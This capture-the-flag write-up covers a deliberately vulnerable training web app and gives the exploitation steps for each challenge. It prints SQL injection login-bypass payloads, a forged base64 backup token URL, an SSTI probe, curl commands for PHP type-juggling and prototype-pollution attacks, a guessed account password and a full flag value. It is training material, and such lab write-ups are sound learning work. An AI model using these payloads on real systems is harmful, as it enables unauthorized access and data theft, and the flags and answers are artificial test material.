ra...", "content": "![](imagedata/logo.png)The CYSCOM JUICE SHOP, like OSWAP Juice Shop, includes a broad spectrum of vulnerabilities from simple input-based flaws to logic and design-level flaws. Understanding the rationale behind each exploit reinforces the importance of layered security, input validation, and robust authentication design.This document provides a detailed analysis of each challenge presented in the CYSCOM Juice Shop Challenge. Each vulnerability is explained alongside its exploitation method and the flag retrieval steps.## TASK 1: MAIN FLAGS### Initial Login Page & SQL Injection The login form is susceptible to SQL Injection, allowing attackers to bypass authentication without knowing valid credentials. This is due to improperly sanitized user inputs in SQL queries.Examples of payloads:```admin' –admin';--admin' /*' UNION SELECT 1,2,3,1,'admin```Entering these in the username followed by any password lets the user login as admin.> [!NOTE]> OR-based injections are filtered, requiring alternative payloads. ### Admin Panel DisclosureThe `/admi`n endpoint, typically hidden, becomes accessible post-SQL injection login. This panel leaks usernames and passwords of all registered users, indicating a Sensitive Data Exposure vulnerability. Flag Retrieval: Visiting this hidden endpoint grant the user a flag. The leaked credentials can be used to authenticate normally to 'admin' user and retrieve the corresponding flag. ### Documentation Panel - Token AccessThis panel is visible only on admin login and shows some open endpoints that we can access. This panel reveals hidden endpoints, accessible only via a Base64-encoded token in the format:```base64(\"username:date\")```This mechanism mimics an insecure form of token-based access control and can be exploited for endpoint access.Flag Retrieval: Visiting `/api/v1/internal/users` endpoint: Also visiting `/api/v1/backup?token=` with the correct token of format `(admin:time)` in base64 format, leads to:Eg: `https://vul-webapp.onrender.com/api/v1/backup?token=YWRtaW46MjEzCg==` ### IDOR (Insecure Direct Object Reference)Users can add and view personal notes with titles and some body. These also supports HTML formatting. By modifying the note ID in the URL (e.g., /note/2 to /note/1), we can access notes belonging to other users.Vulnerability Impact: Lack of access control on object references allows unauthorized data exposure. to ### Cross Site Scripting (XSS)HTML input fields when not sanitized allow malicious scripts to be saved and executed in the browser of other users. This compromises session tokens or redirects victims.Since the notes supports HTML formatting. We can inject code into these notes using basic HTML scripts. ### Encoded Cross Site ScriptingMost websites sanitize the user inputs to prevent XSS vulnerabilities in their webpages by not allowing syntax or text for certain formats. We can bypass this using encoding text to their ascii values or decimal values and injecting the XSS. Browsers decode these before rendering, reactivating the payload.Eg: `` ### Server-Side Template Injection (SSTI)Unsensitized input can sometimes be passed into server-side template engines (like Jinja2). If expressions are interpreted, attackers can run arbitrary code.For example: ``` {{7*7}} => 49```This can lead to full server compromise if RCE is possible.You can inject Server-side templates to the file search of option to reveal sensitive data. This happens when the user input is not sanitized. ### Advanced SSTIExpanding SSTI beyond one field demonstrates lack of sanitization across the app, suggesting systemic weaknesses in input validation such as input to the title of user notes. ### Event-Based Cross Site ScriptingEvent handlers like onerror are triggered under certain browser events. Injecting them into inputs can cause malicious execution without direct user interaction ### Broken Authentication - Token ForgeryThe application allows password resets via a token which is easily found on the \"/admin\" endpoint. Lack of proper validation enables unauthorized access. We need to make a base64 encode token of format:``` username:date (eg: user:02, cabinet:21)```And convert it to `base64`.We can then use this token to reset password of the account.This gives us the broken authentication flag. Only few accounts have the ability to reset password. Not all accounts can reset the password.### Lost User (OSINT Challenge)This is an OSINT challenge that starts by logging in to the `cabinet` user. This user already has a note with a heading \"remember the date\" and a link to a webpage. It also has another note that states that the official account `cyscom` is scheduled for deletion because the password was too easy to guess (a date).On clicking the link to the webpage, we can scroll down to find a timeline to events. Trying the date 15012022 (15 January 2022) as the password for `cyscom` user, we get access to the account that is to be removed. Clicking the `view Flags` button, we are given the Lost User flag. ### Type Juggling (PHP)Type juggling or type casting refers to a PHP functionality. Since PHP does not require explicit type definition in variable declaration, a string can be assigned to a variable 'a' and later on an int can also be assigned to variable 'a'. ``` '0e12345' == '0e54321' // true in PHP```If the computed hash only contains numbers after the first `0e`, PHP will treat the hash as a float. A password hash that begins with `0e` will always appear to match the strings, regardless of what they actually are.This can be used to bypass authentication in vulnerable PHP programs. We can emulate this in our webpage by sending a POST request as:```curl -X POST \"https://SERVER_IP/api/v1/verify_backup\" -H \"Content-Type: application/json\" -H \"Cookie: session=YOUR_SESSION_COOKIE\" -d \"{\\\"id\\\":123,\\\"hash\\\":\\\"0e123456789\\\"}\"``` This request sends a request with these parameters:```{ \"id\": 123, \"hash\": \"0e123456789\"}```To the `/api/v1/verify_backup` endpoint, which bypasses the authentication with an hash starting with 0e.> [!NOTE]> In the above request, replace SERVER\\_IP with the website IP address & YOUR\\_SESSION\\_COOKIE with your session token. This can be found using inspect element. In Firefox, it can be found at:> ### Prototype Pollution (JavaScript)Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which might be inherited by user-defined objects. This vulnerability let's an attacker control property of objects that would otherwise be inaccessible. JavaScript objects inherit from Object.prototype. Injecting into `__proto__` alters default properties application-wide, potentially bypassing logic or introducing backdoors.To emulate this, we can send a curl request to the server using this data:```{ \"__proto__\": { \"polluted\": true }}```Example command:```curl -X POST \"https://SERVER_IP/api/v1/user/preferences\" \\ -H \"Content-Type: application/json\" \\ -H \"Cookie: session=YOUR_SESSION_COOKIE\" \\ -d \"{\\\"normal_key\\\": \\\"normal_value\\\", \\\"__proto__\\\": {\\\"polluted\\\": true}}\"``` > [!NOTE]> In the above request, replace SERVER\\_IP with the website IP address & YOUR\\_SESSION\\_COOKIE with your session token. This can be found using inspect element.## TASK 2: BONUS FLAGS### Image SteganographyData is hidden within image files using LSB or metadata techniques. Tools like zsteg extract such hidden data.Logging into user `Unknown` gives us an image in the notes We can download this image and try to run text extraction techniques on it such as steghide, zsteg, etc. Using `zsteg`, we can see the flag hidden in the image.### Audio SteganographyLogging into the user `user`, we can see that this user has a .wav file as a note. Downloading and running this through a spectrogram generator gives us the flag. ### Hidden in plain sightA flag is revealed to the user in the documentation page of the webpage as the DEBUG\\_KEY. ### Discussions Tab Taking the first letter of every comment from 2nd to 3rd last gives CYSM, our flag format. The 2nd last comment give us the full flag `CYSM{dafweyif29ybvf23d}`" } ]
